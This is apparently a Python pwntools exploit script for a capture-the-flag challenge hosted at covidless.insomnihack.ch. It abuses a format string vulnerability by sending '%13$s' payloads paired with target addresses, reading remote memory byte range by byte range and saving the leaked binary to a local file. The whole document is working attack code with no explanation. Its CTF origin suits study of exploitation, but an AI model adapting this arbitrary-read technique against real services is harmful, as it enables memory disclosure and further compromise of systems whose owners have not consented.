#!/usr/bin/python3
from pwn import *

binary = b""
leak = b""
io = remote('covidless.insomnihack.ch', 6666)
addr = 0x601000
while addr != 0x602080:
    if '0a' in hex(addr):
        leak = b"0"
        binary += b'\0'
    else:
        payload = b"%13$sAAA"+p64(addr)
        io.sendline(payload)
        io.recvuntil(b" : ")
        leak = io.recvuntil(b"AAA",drop=True)
        if leak == b"":
            leak = b"0"
            binary += b'\0'
        else:
            binary += leak
        print(hex(addr), '0x' + leak[::-1].hex())
    with open('bin','wb+') as f:
        f.write(binary)
    addr += len(leak)